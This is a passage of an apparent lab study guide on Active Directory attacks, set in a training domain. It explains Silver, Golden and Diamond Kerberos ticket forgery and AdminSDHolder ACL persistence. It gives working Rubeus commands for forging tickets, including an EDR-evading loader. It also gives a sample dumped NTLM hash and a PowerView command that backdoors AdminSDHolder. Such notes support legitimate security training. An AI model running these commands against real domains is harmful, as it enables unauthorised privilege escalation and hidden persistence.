+<p>🔑 <strong>Service account NTLM/Kerberos key</strong></p>
+<p>So the attacker becomes capable of generating a <strong>valid-looking service ticket</strong> without contacting the KDC.</p>
+<hr />
+<h3 id="encryption-signing">2. Encryption / Signing</h3>
+<p>Kerberos uses <strong>symmetric encryption</strong> to protect tickets.</p>
+<p>Important rule of Kerberos:</p>
+<p>🔑 <strong>Whoever owns the service key can produce a valid ticket for that service</strong></p>
+<p>This is because the service validates tickets using <strong>its own key</strong>.</p>
+<p>Service validation process:</p>
+<p>🖥️ Service receives ticket</p>
+<p>⬇</p>
+<p>Attempts decryption using its key</p>
+<p>If decryption works:</p>
+<p>✔ Ticket assumed valid</p>
+<p>✔ Ticket assumed issued by the KDC</p>
+<p>So if an attacker possesses:</p>
+<p>🔑 Service account hash</p>
+<p>They can generate a ticket that the service will successfully decrypt.</p>
+<p>Example</p>
+<p>Service → <strong>HTTP/dcorp-dc</strong></p>
+<p>Account → <strong>DC computer account</strong></p>
+<p>Attacker with the computer account hash can forge a valid <strong>HTTP service ticket</strong>.</p>
+<p>Because the encryption key matches, the service trusts the ticket.</p>
+<hr />
+<h3 id="pac-privileged-attribute-certificate">3. PAC (Privileged Attribute Certificate)</h3>
+<p>Inside every Kerberos ticket is the <strong>PAC</strong>.</p>
+<p>The PAC contains <strong>authorization information</strong>, including:</p>
+<p>👤 Username</p>
+<p>🆔 User SID</p>
+<p>👥 Group memberships</p>
+<p>⚡ Privileges</p>
+<p>Example PAC content</p>
+<p>User → attacker</p>
+<p>Groups →</p>
+<p>• Domain Users</p>
+<p>• Domain Admins</p>
+<p>• Enterprise Admins</p>
+<hr />
+<p><strong>Important Kerberos Behavior</strong></p>
+<p>When the <strong>KDC creates the PAC</strong>:</p>
+<p>🧠 KDC signs the PAC</p>
+<p>However when the <strong>service receives the ticket</strong>:</p>
+<p>🖥️ Service usually does <strong>not validate the PAC with the KDC</strong></p>
+<p>Instead the service performs:</p>
+<p>1️⃣ Decrypt ticket</p>
+<p>2️⃣ Extract PAC</p>
+<p>3️⃣ Apply privileges</p>
+<p>So if the attacker forges a PAC containing:</p>
+<p>⚠️ <strong>Domain Admin privileges</strong></p>
+<p>The service will accept it <strong>as long as the ticket decrypts correctly</strong>.</p>
+<p>This design choice exists because validating PAC with the DC for every authentication would create <strong>significant performance overhead</strong>.</p>
+<p>Because of that design:</p>
+<p>➡️ Services often trust the PAC blindly</p>
+<p>➡️ Which makes <strong>Silver Tickets effective</strong></p>
+<hr />
+<h3 id="scope-of-access">4. Scope of Access</h3>
+<p>A Silver Ticket only works for the <strong>specific service</strong> whose key was used.</p>
+<p>Reason:</p>
+<p>🔐 Ticket encryption must match the <strong>service account key</strong></p>
+<p>Example</p>
+<p>Forged ticket created for:</p>
+<p>🎯 <strong>CIFS/DC01</strong></p>
+<p>Access granted to:</p>
+<p>📂 SMB file shares</p>
+<p>📂 Administrative shares</p>
+<p>But if the attacker attempts to use that same ticket for:</p>
+<p>❌ LDAP/DC01</p>
+<p>❌ WinRM/DC01</p>
+<p>❌ MSSQL/DC01</p>
+<p>It fails because those services use <strong>different encryption keys</strong>.</p>
+<p>So the scope is limited to:</p>
+<p>🎯 <strong>one service → one server</strong></p>
+<p>Example scopes</p>
+<div class="line-block">Forged Ticket | Access Granted |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">CIFS/DC01 | SMB shares |</div>
+<div class="line-block">HOST/DC01 | WMI / scheduled tasks |</div>
+<div class="line-block">HTTP/WEB01 | Web authentication |</div>
+<div class="line-block">MSSQL/DB01 | Database access |</div>
+<p>This is why <strong>Silver Tickets are service-scoped</strong>, unlike <strong>Golden Tickets which affect the entire domain</strong>.</p>
+<hr />
+<h3 id="persistence-3">5. Persistence</h3>
+<p>Silver Ticket persistence depends on the <strong>service account password lifetime</strong>.</p>
+<p>Common scenarios:</p>
+<p>🖥️ <strong>Machine accounts</strong></p>
+<p>• Password rotates automatically</p>
+<p>• Default rotation ≈ 30 days</p>
+<p>After password rotation:</p>
+<p>🔑 Old service hash becomes invalid</p>
+<p>🎫 Previously forged tickets stop working</p>
+<p>However many environments use:</p>
+<p>👤 <strong>Manual service accounts</strong></p>
+<p>Examples</p>
+<ul>
+<li><p>sqlsvc</p></li>
+<li><p>backupsrv</p></li>
+<li><p>websvc</p></li>
+</ul>
+<p>These accounts often have:</p>
+<p>⚠️ Static passwords</p>
+<p>⚠️ No rotation for years</p>
+<p>If a Silver Ticket is forged using such an account:</p>
+<p>➡️ Persistence can last <strong>months or years</strong></p>
+<hr />
+<h3 id="core-security-weakness">🔑 Core Security Weakness</h3>
+<p>Silver Tickets work because of two Kerberos design assumptions:</p>
+<p>1️⃣ Services trust tickets that decrypt correctly</p>
+<p>2️⃣ Services often <strong>do not validate PAC with the KDC</strong></p>
+<p>So if an attacker knows:</p>
+<p>🔑 <strong>Service account key</strong></p>
+<p>They effectively become:</p>
+<p>⚠️ <strong>the ticket issuer for that service</strong></p>
+<h3 id="pac-validation">Pac Validation</h3>
+<h3 id="who-the-tgs-belongs-to">🧠 Who the TGS “belongs” to</h3>
+<p>A <strong>TGS (service ticket)</strong> is created by the <strong>KDC</strong>, but it is <strong>meant for a specific service</strong>.</p>
+<p>Think of it like this:</p>
+<p>🧠 KDC → <strong>creates ticket</strong></p>
+<p>🎫 Ticket → <strong>addressed to a service</strong></p>
+<p>🖥️ Service → <strong>is the only one who can decrypt it</strong></p>
+<p>Why?</p>
+<p>Because the ticket is encrypted with:</p>
+<p>🔑 <strong>service account key</strong></p>
+<p>Example:</p>
+<p>Service: <strong>CIFS/DC01</strong></p>
+<p>Account: <strong>DC01$</strong></p>
+<p>So:</p>
+<p>🧠 KDC encrypts ticket using → <strong>DC01$ key</strong></p>
+<p>Then:</p>
+<p>👤 Client sends ticket → 🖥️ DC01</p>
+<p>Only DC01 can decrypt it.</p>
+<hr />
+<h3 id="where-the-pac-comes-from">📦 Where the PAC comes from</h3>
+<p>Yes — the <strong>PAC is inserted by the KDC</strong> when it creates the ticket.</p>
+<p>PAC contains:</p>
+<p>👤 User identity</p>
+<p>🆔 SID</p>
+<p>👥 Group memberships</p>
+<p>⚡ Privileges</p>
+<p>So the ticket looks conceptually like:</p>
+<p>🎫 Service Ticket</p>
+<p>┣ 🔐 Encrypted part (for service)</p>
+<p>┃ ┣ 📦 PAC</p>
+<p>┃ ┣ User SID</p>
+<p>┃ ┣ Groups</p>
+<p>┃ ┗ Privileges</p>
+<hr />
+<h3 id="what-happens-in-a-silver-ticket">⚠️ What happens in a Silver Ticket</h3>
+<p>The attacker <strong>does not ask the KDC</strong>.</p>
+<p>Instead:</p>
+<p>👤 Attacker</p>
+<p>➡️ creates fake ticket offline</p>
+<p>Because attacker already knows:</p>
+<p>🔑 <strong>service account hash</strong></p>
+<p>So the attacker can:</p>
+<p>✔ build a ticket</p>
+<p>✔ insert a <strong>fake PAC</strong></p>
+<p>✔ encrypt the ticket using the <strong>service key</strong></p>
+<p>Now the service receives it:</p>
+<p>🖥️ Service</p>
+<p>⬇</p>
+<p>decrypts ticket successfully</p>
+<p>⬇</p>
+<p>reads PAC</p>
+<p>⬇</p>
+<p>applies privileges</p>
+<p>Since the ticket decrypted correctly, the service assumes:</p>
+<p>✔ ticket came from the KDC</p>
+<hr />
+<h3 id="now-your-question-pac-validation">🔍 Now your question: PAC validation</h3>
+<p>Some services can do <strong>PAC validation with the KDC</strong>.</p>
+<p>Flow becomes:</p>
+<p>🖥️ Service receives ticket</p>
+<p>⬇</p>
+<p>decrypts ticket</p>
+<p>⬇</p>
+<p>reads PAC</p>
+<p>⬇</p>
+<p>contacts KDC to verify PAC signature</p>
+<hr />
+<h3 id="what-happens-if-the-pac-was-forged">🚨 What happens if the PAC was forged</h3>
+<p>If attacker modified the PAC:</p>
+<p>📦 PAC contents ≠ KDC signature</p>
+<p>So when service asks the KDC:</p>
+<p>🖥️ Service → 🧠 KDC</p>
+<p>“Is this PAC valid?”</p>
+<p>KDC checks:</p>
+<p>✔ PAC signature</p>
+<p>✔ integrity</p>
+<p>Since attacker <strong>does not have the KDC signing key</strong>:</p>
+<p>❌ PAC verification fails</p>
+<p>Result:</p>
+<p>🚫 Authentication rejected</p>
+<hr />
+<h3 id="why-silver-tickets-often-still-work">🔑 Why Silver Tickets often still work</h3>
+<p>Because in many cases:</p>
+<p>🖥️ Service <strong>does NOT ask the KDC</strong></p>
+<p>Instead it does:</p>
+<p>decrypt ticket ✔</p>
+<p>trust PAC ✔</p>
+<p>grant privileges ✔</p>
+<p>So the forged PAC is <strong>never checked</strong>.</p>
+<p>That’s the key weakness.</p>
+<hr />
+<h3 id="the-important-keys-in-kerberos">⚡ The Important Keys in Kerberos</h3>
+<p>There are <strong>two different keys involved</strong>, which is why this works.</p>
+<p>Service ticket encryption</p>
+<p>🔑 <strong>Service account key</strong></p>
+<p>PAC signature</p>
+<p>🔑 <strong>KDC key</strong></p>
+<p>Attacker with only the <strong>service key</strong> can:</p>
+<p>✔ encrypt the ticket</p>
+<p>✔ make the service accept it</p>
+<p>But attacker <strong>cannot produce a valid PAC signature</strong>, which is why <strong>PAC validation would stop the attack</strong>.</p>
+<h3 id="windows-example---poc">Windows Example - PoC</h3>
+<h2 id="step-by-step-exploitation">⚔️ Step-by-Step Exploitation</h2>
+<hr />
+<h3 id="step-1-get-domain-sid">Step 1: Get Domain SID</h3>
+<p>Use <code>whoami /user</code> or Rubeus:</p>
+<pre class="bash"><code>
+whoami /user
+
+S-1-5-21-719815819-3726368948-3917688648-1001 -&gt; User SID
+
+S-1-5-21-719815819-3726368948-3917688648 -&gt; Domain SID 
+</code></pre>
+<hr />
+<h3 id="step-2-obtain-ntlm-hash-of-service-account">Step 2: Obtain NTLM Hash of Service Account</h3>
+<p>Suppose you’ve dumped credentials using DCSync, LSASS, or secretsdump:</p>
+<pre><code>
+db1$:aad3b435b51404eeaad3b435b51404ee:6e58e06e07588123319fe02feeab775d:::
+</code></pre>
+<p>We need the RC4/NTLM hash:</p>
+<pre><code>
+6e58e06e07588123319fe02feeab775d
+</code></pre>
+<hr />
+<h3 id="step-3-identify-target-spn">Step 3: Identify Target SPN</h3>
+<p>Service running is MSSQL, target server is <code>db1</code>.</p>
+<p>SPN becomes:</p>
+<pre><code>
+MSSQLSvc/db1.dollarcorp.moneycorp.local
+</code></pre>
+<hr />
+<h3 id="step-4-forge-silver-ticket">Step 4: Forge Silver Ticket</h3>
+<p>Use Rubeus to forge the Silver Ticket:</p>
+<pre class="bash"><code>
+Rubeus.exe silver /service:MSSQLSvc/db1.dollarcorp.moneycorp.local \
+
+/rc4:6e58e06e07588123319fe02feeab775d \
+
+/sid:S-1-5-21-719815819-3726368948-3917688648 \
+
+/user:Administrator \
+
+/domain:dollarcorp.moneycorp.local \
+
+/ptt
+
+OR
+
+**#prefered**
+
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local \
+
+/rc4:6e58e06e07588123319fe02feeab775d \
+
+/sid:S-1-5-21-719815819-3726368948-3917688648 \
+
+/ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt 
+</code></pre>
+<p>✅ This creates a forged service ticket for the MSSQL service, impersonating Administrator, signed with the service account’s hash, and injects it into memory.</p>
+<div class="line-block">Part | Purpose |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><code>/service:http/dcorp-dc...</code> | The <strong>SPN (Service Principal Name)</strong> for which the forged ticket is being created. In this case, it’s an <strong>HTTP service</strong> on the domain controller machine. |</div>
+<div class="line-block"><code>/rc4:&lt;hash&gt;</code> | The <strong>NTLM hash of the service account</strong> (in this case, probably the computer account of <code>dcorp-dc</code>). It is used to <strong>encrypt and sign</strong> the forged service ticket. |</div>
+<div class="line-block"><code>/sid:&lt;domain SID&gt;</code> | The <strong>SID of the domain</strong>. Required for crafting the user’s authorization data (PAC). |</div>
+<div class="line-block"><code>/user:Administrator</code> | The <strong>impersonated user</strong> for the forged ticket. You’re pretending to be <code>Administrator</code>. |</div>
+<div class="line-block"><code>/domain:&lt;domain FQDN&gt;</code> | The target domain. |</div>
+<div class="line-block"><code>/ptt</code> | “<strong>Pass-the-ticket</strong>”: directly injects the crafted ticket into memory. |</div>
+<div class="line-block"><code>/ldap</code> | <strong>Optional(Use only if you are forging ticket for DC service account):</strong> After forging the ticket, Rubeus performs an <strong>LDAP query to the Domain Controller</strong>, using the <strong>forged identity</strong> to fetch user attributes, group membership, etc. |</div>
+<p><strong>While forging silver ticket we mostly use RC4(NTLM) Key of the service not the AES key, because mostly of the service accounts still use RC4 instead of AES.</strong></p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>above hashes are got by dumping the lsass of DC, steps shown in golden ticket attack.</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>Now you can view whether the ticket has been generated and imported in session using <strong>klist</strong> command. But some heavily monitored EDRs have problem with klist command so to avoid this you can use <strong>rubeus klist</strong> option:</p>
+<pre class="powershell"><code>
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<hr />
+<h3 id="step-5-access-the-mssql-service"><strong>Step 5: Access the MSSQL Service</strong></h3>
+<p>Now, you can connect to MSSQL (using tools like <code>sqlcmd</code>, PowerUpSQL, or AD module) as <code>Administrator</code>.</p>
+<pre class="bash"><code>
+sqlcmd -S db1.dollarcorp.moneycorp.local
+</code></pre>
+<p>🎯 You’ll be granted access with <strong>Administrator rights</strong>, since the service reads the ticket and sees:</p>
+<p><strong>“This is from user Administrator”</strong> — and it was signed properly (with its own key), so it trusts it.</p>
+<p>OR</p>
+<p>Accessing DC as we have Service ticket of DC in previous step:</p>
+<p>As we have got <strong><em>http</em></strong> service ticket so we can access dc using winrs:</p>
+<pre class="powershell"><code>
+winrs -r:dcorp.dollarcorp.moneycorp.local cmd
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>As the ticket is for http service only so when we try to list <strong>C$</strong> on DC, we get error message because we don’t service ticket for CIFS service.</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<hr />
+<h2 id="difference-between-golden-silver-diamond">Difference Between Golden Silver &amp; Diamond</h2>
+<h3 id="golden-ticket-no-as-req-trail">🟡 Golden Ticket – No AS-REQ Trail</h3>
+<p>A Golden Ticket is created <strong>completely offline</strong> using the <strong>krbtgt account hash</strong>.</p>
+<p><strong>Normal Kerberos login flow</strong></p>
+<p>1️⃣ User authenticates to the DC</p>
+<p>➡️ sends <strong>AS-REQ</strong> (Authentication Service Request)</p>
+<p>2️⃣ DC responds</p>
+<p>➡️ <strong>AS-REP</strong> containing the <strong>TGT</strong></p>
+<p>3️⃣ User uses that TGT later to request service tickets.</p>
+<p>So the Domain Controller normally logs:</p>
+<p>📜 <strong>Event 4768 — TGT issued</strong></p>
+<hr />
+<p><strong>What happens in a Golden Ticket attack</strong></p>
+<p>In a Golden Ticket scenario:</p>
+<p>👤 Attacker</p>
+<p>🔧 <strong>forges a TGT offline</strong></p>
+<p>Because they already know:</p>
+<p>🔑 <strong>krbtgt key</strong></p>
+<p>So the attacker skips the entire <strong>AS-REQ stage</strong>.</p>
+<p>Flow becomes:</p>
+<p>👤 Attacker</p>
+<p>➡️ uses forged TGT directly to request services</p>
+<p>From the DC’s perspective:</p>
+<p>❌ No AS-REQ happened</p>
+<p>❌ No TGT was issued</p>
+<p>But suddenly the attacker requests services using a <strong>TGT that the DC never created</strong>.</p>
+<p>So logs look like:</p>
+<p>⚠️ Service ticket requests appear</p>
+<p>⚠️ But <strong>no earlier TGT issuance</strong></p>
+<p>This gap is suspicious for defenders.</p>
+<p>That’s what people mean by:</p>
+<p>➡️ <strong>“Golden Ticket leaves no AS-REQ trail.”</strong></p>
+<h3 id="diamond-ticket-uses-a-legitimate-tgt">🔵 Diamond Ticket – Uses a Legitimate TGT</h3>
+<p>A Diamond Ticket works differently.</p>
+<p>Instead of forging the TGT entirely, the attacker:</p>
+<p>1️⃣ Authenticates normally to the DC</p>
+<p>2️⃣ Receives a <strong>legitimate TGT</strong></p>
+<p>3️⃣ Decrypts it locally</p>
+<p>4️⃣ Modifies the <strong>PAC / privileges</strong></p>
+<p>5️⃣ Re-signs it using the <strong>krbtgt key</strong></p>
+<p>So the flow becomes:</p>
+<p>👤 Attacker</p>
+<p>➡️ normal login</p>
+<p>➡️ DC issues TGT</p>
+<p>The DC logs:</p>
+<p>📜 Event 4768 (TGT issued)</p>
+<p>Then the attacker modifies that TGT <strong>after receiving it</strong>.</p>
+<p>From the DC’s perspective:</p>
+<p>✔ TGT request exists</p>
+<p>✔ timestamps look valid</p>
+<p>✔ authentication looks normal</p>
+<p>So there is <strong>no obvious missing event</strong>.</p>
+<p>That’s why people say:</p>
+<p>➡️ <strong>Diamond Tickets have valid timestamps and log evidence.</strong></p>
+<h3 id="simple-mental-model">🎯 Simple Mental Model</h3>
+<p>Golden Ticket</p>
+<p>🧠 DC never issued the TGT</p>
+<p>🎫 Attacker fabricated it</p>
+<p>🚨 Missing authentication logs</p>
+<p>Diamond Ticket</p>
+<p>🧠 DC really issued the TGT</p>
+<p>🔧 Attacker modified it later</p>
+<p>👀 Logs look legitimate</p>
+<h3 id="kerberos-ticket-attacks-difference-quick-mental-map">🧠 Kerberos Ticket Attacks Difference – Quick Mental Map</h3>
+<div class="line-block">Attack | What is forged/modified | Key required | Contact with DC |</div>
+<div class="line-block">— | — | — | — |</div>
+<div class="line-block">Silver Ticket | <strong>TGS (service ticket)</strong> | Service account hash | ❌ Not required |</div>
+<div class="line-block">Golden Ticket | <strong>TGT forged from scratch</strong> | krbtgt hash | ❌ Not required |</div>
+<div class="line-block">Diamond Ticket | <strong>Legitimate TGT modified</strong> | krbtgt hash | ✔ Required initially |</div>
+<hr />
+<h3 id="golden-ticket">🥇 Golden Ticket</h3>
+<p>Attack idea:</p>
+<p>➡️ <strong>Create a fake TGT completely offline</strong></p>
+<p>Requirements:</p>
+<p>🔑 <strong>krbtgt account hash</strong></p>
+<p>Why?</p>
+<p>Because the <strong>Kerberos</strong> Domain Controller signs all TGTs with the <strong>krbtgt key</strong>.</p>
+<p>So attacker does:</p>
+<p>🛠 Forge TGT</p>
+<p>📦 Insert PAC (Domain Admin etc.)</p>
+<p>🔏 Sign with krbtgt key</p>
+<p>Then use it like a real TGT:</p>
+<p>👤 Attacker</p>
+<p>➡️ TGS-REQ → DC</p>
+<p>DC verifies signature → looks valid → issues service ticket.</p>
+<p>Key characteristic:</p>
+<p>❌ <strong>No AS-REQ ever happened</strong></p>
+<p>The TGT was never issued by the DC.</p>
+<hr />
+<h3 id="silver-ticket">🥈 Silver Ticket</h3>
+<p>Attack idea:</p>
+<p>➡️ <strong>Forge the service ticket instead of the TGT</strong></p>
+<p>Requirements:</p>
+<p>🔑 <strong>service account hash</strong></p>
+<p>Example services:</p>
+<ul>
+<li>CIFS/DC01</li>
+</ul>
+<p>• MSSQLSvc/db01</p>
+<p>• HTTP/web01</p>
+<p>Flow:</p>
+<p>👤 Attacker</p>
+<p>🛠 Forge <strong>TGS</strong></p>
+<p>Then present it directly to the service:</p>
+<p>👤 Attacker → 🖥️ Service</p>
+<p>Important:</p>
+<p>❌ Domain Controller is never contacted.</p>
+<p>The service just decrypts the ticket using its own key and trusts it.</p>
+<hr />
+<h3 id="diamond-ticket">💎 Diamond Ticket</h3>
+<p>Diamond Ticket sits <strong>between Golden and normal Kerberos</strong>.</p>
+<p>Instead of creating a fake TGT:</p>
+<p>➡️ Attacker <strong>gets a real TGT from the DC first</strong></p>
+<p>Steps:</p>
+<p>1️⃣ Attacker authenticates normally</p>
+<p>2️⃣ DC issues a legitimate TGT</p>
+<p>3️⃣ Attacker decrypts it locally</p>
+<p>4️⃣ Modifies the <strong>PAC (privileges)</strong></p>
+<p>5️⃣ Re-signs it using <strong>krbtgt key</strong></p>
+<p>Now attacker uses the modified ticket.</p>
+<p>Key characteristics:</p>
+<p>✔ TGT actually came from DC</p>
+<p>✔ Valid timestamps</p>
+<p>✔ Legitimate AS-REQ exists in logs</p>
+<p>So logs look normal.</p>
+<hr />
+<h3 id="visual-comparison">🔎 Visual Comparison</h3>
+<p>Normal Kerberos</p>
+<p>User → <strong>AS-REQ</strong> → DC</p>
+<p>DC → <strong>TGT issued</strong></p>
+<hr />
+<p>Golden Ticket</p>
+<p>Attacker → <strong>forge TGT offline</strong></p>
+<p>No AS-REQ.</p>
+<hr />
+<p>Diamond Ticket</p>
+<p>Attacker → <strong>AS-REQ</strong> → DC</p>
+<p>DC → legitimate TGT</p>
+<p>Attacker → <strong>modifies TGT</strong></p>
+<hr />
+<p>Silver Ticket</p>
+<p>Attacker → <strong>forge TGS</strong></p>
+<p>Attacker → <strong>directly to service</strong></p>
+<p>DC never involved.</p>
+<hr />
+<h3 id="one-line-summary">🎯 One-line summary</h3>
+<p>Golden Ticket</p>
+<p>➡️ <strong>Fake TGT</strong></p>
+<p>Silver Ticket</p>
+<p>➡️ <strong>Fake service ticket</strong></p>
+<p>Diamond Ticket</p>
+<p>➡️ <strong>Real TGT but modified</strong></p>
+<h3 id="golden-vs-silver-vs-diamond-quick-table">🥇 <strong>Golden vs Silver vs Diamond (Quick Table)</strong></h3>
+<div class="line-block">Attack | Uses Hash | Forged Part | Scope | Stealth |</div>
+<div class="line-block">— | — | — | — | — |</div>
+<div class="line-block"><strong>Silver Ticket</strong> | Service account hash | TGS only | One service on one machine | ⭐⭐ Very stealthy |</div>
+<div class="line-block"><strong>Golden Ticket</strong> | KRBTGT hash | Entire TGT | Entire domain | ⭐ Medium |</div>
+<div class="line-block"><strong>Diamond Ticket</strong> | KRBTGT hash + normal creds | PAC inside real TGT | Entire domain | ⭐⭐⭐ Most stealthy |</div>
+<h2 id="persistence-using-acl--adminsdholder---domain-persistence">Persistence using ACL -AdminSDHolder - Domain Persistence</h2>
+<h3 id="understanding-the-core-concept-3">Understanding The Core Concept</h3>
+<h4 id="what-is-adminsdholder">🔐 <strong>What is AdminSDHolder?</strong></h4>
+<p><strong>AdminSDHolder</strong> is a special security object in Active Directory located in <strong>CN=System,DC=domain,DC=com</strong>.</p>
+<p>Its main purpose is to <strong>define and protect the Access Control Lists (ACLs)</strong> of a set of high-privilege accounts and groups in Active Directory called <strong>Protected Groups</strong>.— like <strong>Domain Admins</strong> or <strong>Enterprise Admins</strong>.</p>
+<p>Think of it like this:</p>
+<blockquote>
+<p>“Whatever permissions are set on AdminSDHolder will be copied to all the VIP accounts (called protected accounts) regularly.”</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<hr />
+<h4 id="what-are-protected-groups">🧱 <strong>What Are Protected Groups?</strong></h4>
+<p>These groups are considered <strong>high-value targets</strong> and include:</p>
+<div class="line-block">Group Name | Privilege Level |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Domain Admins | Full control of domain |</div>
+<div class="line-block">Enterprise Admins | Full control of forest |</div>
+<div class="line-block">Schema Admins | Modify schema |</div>
+<div class="line-block">Administrators | Local admin on all DCs |</div>
+<div class="line-block">Account Operators | User/group management |</div>
+<div class="line-block">Backup Operators | Backup/restore privilege |</div>
+<div class="line-block">Server Operators | Admin services on DC |</div>
+<div class="line-block">Print Operators | Load drivers (code execution) |</div>
+<div class="line-block">Replicator | Replication permission |</div>
+<div class="line-block">Domain Controllers | All DC computer objects |</div>
+<div class="line-block">Read-Only Domain Controllers | Read-only DCs |</div>
+<p>These accounts are <strong>sensitive</strong> and thus protected from unauthorized ACL changes.</p>
+<hr />
+<h4 id="what-is-the-sdprop-process">🔁 <strong>What is the SDProp Process?</strong></h4>
+<p>SDProp = <strong>Security Descriptor Propagator</strong>, a built-in process that runs <strong>every 60 minutes by default</strong> on the <strong>PDC Emulator</strong>.</p>
+<ul>
+<li><p>SDProp compares the <strong>ACL of AdminSDHolder</strong> with the ACLs of <strong>each protected group and its members</strong>.</p></li>
+<li><p>If there’s a difference, SDProp <strong>overwrites the ACLs of protected objects</strong> with that of AdminSDHolder.</p></li>
+<li><p>This includes <strong>users who are members of protected groups</strong>, even nested members.</p></li>
+</ul>
+<p>➡️ <strong>ACLs of protected users get reset every hour to match AdminSDHolder</strong>.</p>
+<h4 id="structure">📂 Structure</h4>
+<pre><code>
+DC=domain,DC=local
+
+│
+
+├── OU=IT
+
+│    ├── john (user)
+
+│    ├── pc1 (computer)
+
+│
+
+├── OU=Admins
+
+│    ├── admin1 (Domain Admin)
+
+│
+
+├── CN=System
+
+│    └── CN=AdminSDHolder   ← ⭐ IMPORTANT
+</code></pre>
+<h4 id="admincount-1-very-important-concept">🧠 2. adminCount = 1 (Very Important Concept)</h4>
+<p><strong>❓ Your Question</strong></p>
+<blockquote>
+<p>“Does adminCount = 1 mean object is protected by AdminSDHolder?”</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<hr />
+<p><strong>✅ Short Answer</strong></p>
+<pre><code>
+adminCount = 1  ⇒ YES, the object is (or was) protected
+</code></pre>
+<hr />
+<h4 id="full-explanation">🧠 Full Explanation</h4>
+<p><strong>🔐 What happens when a user becomes privileged?</strong></p>
+<p>Example:</p>
+<pre><code>
+john → added to Domain Admins
+</code></pre>
+<hr />
+<p><strong>🔄 AD does:</strong></p>
+<pre><code>
+adminCount = 1
+
+Inheritance = disabled
+
+ACL replaced by AdminSDHolder template
+</code></pre>
+<hr />
+<p><strong>🔑 Meaning of adminCount</strong></p>
+<pre><code>
+adminCount = 1 = Flag indicating SDProp protection applies
+</code></pre>
+<p><strong>Example:-</strong></p>
+<p>If you compromise a Domain Controller and have Domain Admin rights, you can go to the properties of the Domain Admins group and add a user (<strong><em>e.g., student2</em></strong>) to the Security/Permissions tab (which contains all the ACLs), giving them FullControl over the group.</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>Although <code>eviluser</code> is <strong>not an actual member</strong> of the Domain Admins group, it can still <strong>fully control the group</strong> due to the permission he has.</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p><em>The above examples showes that the add user <strong>student2</strong> is not the part of domain admin group but still has full rights</em></p>
+<p>However, because <strong>Domain Admins is a protected group</strong>, the <strong>SDProp process</strong> will run <strong>every 60 minutes</strong> on the PDC Emulator and <strong>overwrite the ACL</strong> of the Domain Admins group by <strong>copying the ACL from the AdminSDHolder object</strong>.</p>
+<p>As a result, the custom permission given to <code>student2</code> will be <strong>removed</strong>, and the ACL will be reset to its <strong>default protected state</strong>, thereby <strong>removing <code>student2</code>’s control</strong> over the Domain Admins group.</p>
+<p>To <strong>bypass this automatic cleanup</strong>, an attacker can instead <strong>modify the ACL of the AdminSDHolder object itself</strong> and <strong>add <code>student2</code> with FullControl</strong> there. Since <strong>AdminSDHolder is not reset by SDProp</strong>, this change <strong>persists</strong>, and every time SDProp runs, it will <strong>copy the modified ACL to all protected groups and users</strong> — thereby <strong>granting <code>student2</code> persistent and hidden control</strong> over high-privileged accounts <strong>without needing group membership</strong>.</p>
+<p><strong><em>Adding user to AdminSDHolder:</em></strong></p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p><strong><em>SDProp overwritting the ACL of all the protected groups by copying from AdminSDHolder, ultimately adding the user to the ACL of the Domain Admin groups(now student 2 will be added to all protect groups - ACLs):</em></strong></p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<h4 id="persistence-via-adminsdholder-abuse">💥 <strong>Persistence via AdminSDHolder Abuse</strong></h4>
+<p>If you gain <strong>Domain Admin privileges</strong>, you can <strong>modify the ACL of the AdminSDHolder object</strong> to <strong>backdoor access</strong>.</p>
+<h4 id="attack-goals">🎯 Attack Goals:</h4>
+<ul>
+<li><p>Get <strong>FullControl / WriteDACL / WriteOwner</strong> rights to privileged accounts (without being a visible group member).</p></li>
+<li><p>Survive <strong>group membership cleanup</strong> or <strong>blue team detection</strong>.</p></li>
+</ul>
+<hr />
+<h4 id="how-attackers-abuse-adminsdholder">🧠 <strong>How Attackers Abuse AdminSDHolder</strong></h4>
+<p>🧠 <strong>Goal:</strong></p>
+<p>Grant <strong><code>student1</code></strong> persistent, hidden access (like FullControl, ResetPassword, or WriteMembers) on <strong>protected groups</strong> (like <strong>Domain Admins</strong>) by modifying the <strong>AdminSDHolder</strong> object, and force SDProp to apply those changes immediately.</p>
+<hr />
+<h4 id="step-by-step-breakdown">🔐 Step-by-Step Breakdown:</h4>
+<hr />
+<p><strong>✅ Step 1: Add <code>student1</code> to the ACL of AdminSDHolder (Persistence Setup)</strong></p>
+<p>🛠️ Using <strong>PowerView</strong> (as Domain Admin):</p>
+<pre class="powershell"><code>
+Add-DomainObjectAcl `
+
+  -TargetIdentity &#39;CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local&#39; `
+
+  -PrincipalIdentity student1 `
+
+  -Rights All `
+
+  -PrincipalDomain dollarcorp.moneycorp.local `
+
+  -TargetDomain dollarcorp.moneycorp.local `
+
+  -Verbose
+</code></pre>
+<p>🔹 This gives <code>student1</code> <strong>FullControl</strong> on <strong>AdminSDHolder</strong>.</p>
+<p>🔁 Which means: <strong>Every 60 minutes</strong>, SDProp will <strong>copy these permissions</strong> to:</p>
+<ul>
+<li><p>Domain Admins</p></li>
+<li><p>Enterprise Admins</p></li>
+<li><p>Schema Admins</p></li>
+<li><p>And all protected users</p></li>
+</ul>
+<blockquote>
